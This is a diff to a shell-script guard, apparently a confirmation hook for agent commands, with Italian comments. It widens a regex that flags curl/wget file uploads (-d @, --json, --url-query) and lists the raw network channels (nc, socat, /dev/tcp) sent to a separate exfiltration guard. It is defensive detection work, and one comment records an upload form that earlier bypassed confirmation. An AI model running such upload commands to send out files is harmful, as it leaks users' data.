@@ -141,7 +141,7 @@ PATTERN_COMMIT="(^|[;&|(\`'\"${_NL}])[[:space:]]*((env|command|exec|nohup|time|x
 _FINE_ARG="([[:space:]]|[\"'],[[:space:]]*[\"']?)"
 # Un & seguito da un carattere che non è spazio né operatore sta dentro l'URL (`?a=1&b=2`) e non chiude
 # il comando: prima `curl "https://x/?a=1&b=2" -d @file` passava senza conferma (30/10/2026).
-PATTERN_EXFIL='(curl|wget)([^|;&]|&[^[:space:]&|;])*(-F'"$_FINE_ARG"'*[^[:space:]]*[@<]|--form'"$_FINE_ARG"'*[^[:space:]]*[@<]|-T'"$_FINE_ARG"'|--upload-file|--(post|body)-file|-d'"$_FINE_ARG"'*@|--data[a-z-]*'"$_FINE_ARG"'*@)'
+PATTERN_EXFIL='(curl|wget)([^|;&]|&[^[:space:]&|;])*(-F'"$_FINE_ARG"'*[^[:space:]]*[@<]|--form'"$_FINE_ARG"'*[^[:space:]]*[@<]|-T'"$_FINE_ARG"'|--upload-file|--(post|body)-file|-d'"$_FINE_ARG"'*["'"'"']?@|--data[a-z-]*'"$_FINE_ARG"'*["'"'"']?@|--json'"$_FINE_ARG"'*["'"'"']?@|--url-query'"$_FINE_ARG"'*["'"'"']?@)'
 # Il GET non passa da exfil-guard (ramo tolto il 30/10/2026, #4325). Vanno a exfil-guard i soli canali di rete grezzi: una pipe verso
 # nc/ncat/netcat/socat, /dev/tcp e /dev/udp. Dal 28/10/2026 curl con $() e il codice node o python che
 # chiama la rete non passano più da qui: li giudica il classificatore di auto mode. Uno script che
